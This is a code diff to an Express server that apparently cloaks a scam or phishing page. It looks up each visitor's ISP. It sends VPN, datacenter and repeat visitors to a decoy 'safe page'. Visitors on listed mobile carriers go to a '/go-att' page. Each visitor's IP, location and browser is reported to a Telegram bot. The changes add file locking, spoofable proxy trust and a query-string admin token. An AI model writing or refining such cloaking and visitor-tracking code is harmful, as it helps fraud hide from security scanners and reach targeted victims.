@@ -13,7 +13,7 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 // Trust proxy for accurate IP detection behind load balancers
-app.set('trust proxy', 1);
+app.set('trust proxy', true);
 
 // Path to store visited IPs
 const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');
@@ -34,47 +34,56 @@ if (!fssync.existsSync(SETTINGS_FILE)) {
     }));
 }
 
+// Mutex-like lock for file operations
+let fileLock = false;
+async function withLock(fn) {
+    while (fileLock) {
+        await new Promise(resolve => setTimeout(resolve, 50));
+    }
+    fileLock = true;
+    try {
+        return await fn();
+    } finally {
+        fileLock = false;
+    }
+}
+
 async function getVisitedIps() {
     try {
         const data = await fs.readFile(VISITED_IPS_FILE, 'utf8');
         let ips = JSON.parse(data);
-        
-        // Filter out IPs older than 24 hours
         const now = Date.now();
         const twentyFourHours = 24 * 60 * 60 * 1000;
-        const freshIps = ips.filter(entry => {
-            // Support both old format (string) and new format (object)
+        return ips.filter(entry => {
             const timestamp = typeof entry === 'object' ? entry.timestamp : 0;
             return (now - timestamp) < twentyFourHours;
         });
-
-        if (freshIps.length !== ips.length) {
-            await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(freshIps, null, 2));
-        }
-        return freshIps;
     } catch (e) {
         return [];
     }
 }
 
 async function addVisitedIp(ip) {
-    const ips = await getVisitedIps();
-    const existingIndex = ips.findIndex(entry => (typeof entry === 'object' ? entry.ip : entry) === ip);
-    
-    if (existingIndex === -1) {
-        ips.push({ ip, timestamp: Date.now() });
-        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
-    } else if (typeof ips[existingIndex] !== 'object') {
-        // Update old format to new format
-        ips[existingIndex] = { ip, timestamp: Date.now() };
-        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
-    }
+    await withLock(async () => {
+        const ips = await getVisitedIps();
+        const existingIndex = ips.findIndex(entry => (typeof entry === 'object' ? entry.ip : entry) === ip);
+        
+        if (existingIndex === -1) {
+            ips.push({ ip, timestamp: Date.now() });
+            await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
+        } else if (typeof ips[existingIndex] !== 'object') {
+            ips[existingIndex] = { ip, timestamp: Date.now() };
+            await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
+        }
+    });
 }
 
 async function removeVisitedIp(ip) {
-    const ips = await getVisitedIps();
-    const newIps = ips.filter(entry => (typeof entry === 'object' ? entry.ip : entry) !== ip);
-    await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
+    await withLock(async () => {
+        const ips = await getVisitedIps();
+        const newIps = ips.filter(entry => (typeof entry === 'object' ? entry.ip : entry) !== ip);
+        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
+    });
 }
 
 async function getForcedIps() {
@@ -87,17 +96,21 @@ async function getForcedIps() {
 }
 
 async function addForcedIp(ip) {
-    const ips = await getForcedIps();
-    if (!ips.includes(ip)) {
-        ips.push(ip);
-        await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(ips, null, 2));
-    }
+    await withLock(async () => {
+        const ips = await getForcedIps();
+        if (!ips.includes(ip)) {
+            ips.push(ip);
+            await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(ips, null, 2));
+        }
+    });
 }
 
 async function removeForcedIp(ip) {
-    const ips = await getForcedIps();
-    const newIps = ips.filter(i => i !== ip);
-    await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(newIps, null, 2));
+    await withLock(async () => {
+        const ips = await getForcedIps();
+        const newIps = ips.filter(i => i !== ip);
+        await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(newIps, null, 2));
+    });
 }
 
 async function getSettings() {
@@ -110,18 +123,17 @@ async function getSettings() {
             ...settings
         };
     } catch (e) {
-        return { 
-            isSuspiciousEnabled: true, 
-            isIspFilterEnabled: true 
-        };
+        return { isSuspiciousEnabled: true, isIspFilterEnabled: true };
     }
 }
 
 async function updateSettings(newSettings) {
-    const settings = await getSettings();
-    const updated = { ...settings, ...newSettings };
-    await fs.writeFile(SETTINGS_FILE, JSON.stringify(updated, null, 2));
-    return updated;
+    return await withLock(async () => {
+        const settings = await getSettings();
+        const updated = { ...settings, ...newSettings };
+        await fs.writeFile(SETTINGS_FILE, JSON.stringify(updated, null, 2));
+        return updated;
+    });
 }
 
 function escapeHtml(str) {
@@ -199,8 +211,9 @@ function isBot(req) {
 
 // Admin Authentication Middleware
 function requireAdmin(req, res, next) {
+    // Allow token in header (for API) or query (for initial page load)
     const token = req.headers['x-admin-token'] || req.query.token;
-    if (token !== ADMIN_TOKEN) {
+    if (token !== process.env.ADMIN_TOKEN) {
         return res.status(401).send('Unauthorized: Invalid Admin Token');
     }
     next();
@@ -223,13 +236,32 @@ app.get('/init', async (req, res) => {
 
     console.log(`[Init] Visit from IP: ${clientIp} | UA: ${userAgent}`);
     
-    // Fetch settings
-    const settings = await getSettings();
-
-    // Check for forced redirect IPs
+    // 1. FAST CHECKS (Local memory/file only)
     const forcedIps = await getForcedIps();
     const isForced = forcedIps.includes(clientIp);
 
+    if (isForced) {
+        console.log(`[Init] IP ${clientIp} is forced. Redirecting to ATT page.`);
+        // Send simplified notification for forced visit (optional, but keep it consistent)
+        try {
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: `✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *Browser:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`,
+                parse_mode: 'Markdown'
+            });
+        } catch (e) {}
+        return res.json({ redirect: '/go-att' });
+    }
+
+    const visitedIps = await getVisitedIps();
+    const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
+    
+    if (isVisited) {
+        console.log(`[Init] IP ${clientIp} already visited. Redirecting to safe page.`);
+        return res.json({ redirect: NON_ATT_LANDING_PAGE });
+    }
+
+    // 2. FETCH EXTERNAL DATA (Slowest part)
     let data = null;
     try {
         const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`);
@@ -239,18 +271,16 @@ app.get('/init', async (req, res) => {
         console.error('[Init] ISP lookup failed:', error.message);
     }
 
-    // Security: Detect proxies, VPNs, and Hosting providers
-    const isSuspicious = data && (data.proxy || data.hosting);
-    if (isSuspicious) {
-        console.log(`[Init] suspicious activity detected: proxy=${data.proxy}, hosting=${data.hosting}`);
-    }
+    // 3. SECURITY CHECKS
+    const isProxy = data && data.proxy === true;
+    const isHosting = data && data.hosting === true;
+    const isSuspicious = isProxy || isHosting;
+    const settings = await getSettings();
 
     // Send Telegram Notification
-    let message = isForced ? `✨ *FORCED REDIRECT VISIT* \n\n` : `🚀 *New App Visit!* \n\n`;
-    
-    if (isSuspicious && !isForced) {
-        message += `⚠️ *SUSPICIOUS VISIT DETECTED*\n\n`;
-    }
+    let message = `🚀 *New App Visit!* \n\n`;
+    if (isProxy) message += `🚫 *VPN/PROXY DETECTED*\n\n`;
+    else if (isHosting) message += `☁️ *DATACENTER/HOSTING DETECTED*\n\n`;
 
     if (data && data.status === 'success') {
         message += `📍 *IP:* ${data.query}\n` +
@@ -261,11 +291,7 @@ app.get('/init', async (req, res) => {
     }
     
     message += `💻 *Browser:* ${userAgent}\n`;
-    
-    if (isSuspicious) {
-        message += `🛡️ *Flags:* ${data.proxy ? 'Proxy ' : ''}${data.hosting ? 'Hosting' : ''}\n`;
-    }
-
+    if (isSuspicious) message += `🛡️ *Flags:* ${isProxy ? 'Proxy/VPN ' : ''}${isHosting ? 'DataCenter' : ''}\n`;
     message += `🕒 *Time:* ${new Date().toLocaleString()}`;
 
     try {
@@ -276,44 +302,24 @@ app.get('/init', async (req, res) => {
         });
     } catch (e) {}
 
-    // Determine Redirect URL
+    // 4. FINAL REDIRECT LOGIC
     let targetUrl = NON_ATT_LANDING_PAGE;
+    const isSuspiciousMatch = settings.isSuspiciousEnabled && (isProxy || isHosting);
     
-    if (isForced) {
-        console.log(`[Init] IP ${clientIp} is forced. Redirecting to ATT page.`);
+    if (isSuspiciousMatch) {
+        console.log(`[Init] Suspicious IP (Proxy:${isProxy}/Hosting:${isHosting}) detected. Filter is ON. Redirecting to safe page.`);
+        targetUrl = NON_ATT_LANDING_PAGE;
+    } else if (!settings.isIspFilterEnabled) {
+        console.log(`[Init] ISP Filter is DISABLED. Redirecting all clean traffic to ATT page.`);
         targetUrl = '/go-att';
-    } else {
-        // Normal checks
-        const visitedIps = await getVisitedIps();
-        const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
-        
-        if (isVisited) {
-            console.log(`[Init] IP ${clientIp} already visited. Redirecting to safe page.`);
-            targetUrl = NON_ATT_LANDING_PAGE;
+    } else if (data && data.status === 'success') {
+        const userISP = (data.isp || data.org || "").toUpperCase();
+        if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
+            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
+            targetUrl = '/go-att';
         } else {
-            const isSuspiciousMatch = isSuspicious && settings.isSuspiciousEnabled;
-            
-            if (isSuspiciousMatch) {
-                console.log(`[Init] Suspicious IP detected and filter is ENABLED. Redirecting to safe page.`);
-                targetUrl = NON_ATT_LANDING_PAGE;
-            } else if (!settings.isIspFilterEnabled) {
-                // ISP Filter is OFF - Redirect everyone who isn't suspicious
-                console.log(`[Init] ISP Filter is DISABLED. Redirecting all clean traffic to ATT page.`);
-                targetUrl = '/go-att';
-            } else if (data && data.status === 'success') {
-                // ISP Filter is ON - Standard ISP check
-                const userISP = (data.isp || data.org || "").toUpperCase();
-                if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
-                    console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
-                    targetUrl = '/go-att';
-                } else {
-                    console.log(`[Init] No ISP match for: ${userISP}. Redirecting to safe page.`);
-                    targetUrl = NON_ATT_LANDING_PAGE;
-                }
-            } else {
-                console.log(`[Init] Redirecting to safe page. Status: ${data?.status}`);
-                targetUrl = NON_ATT_LANDING_PAGE;
-            }
+            console.log(`[Init] No ISP match for: ${userISP}. Redirecting to safe page.`);
+            targetUrl = NON_ATT_LANDING_PAGE;
         }
     }
 
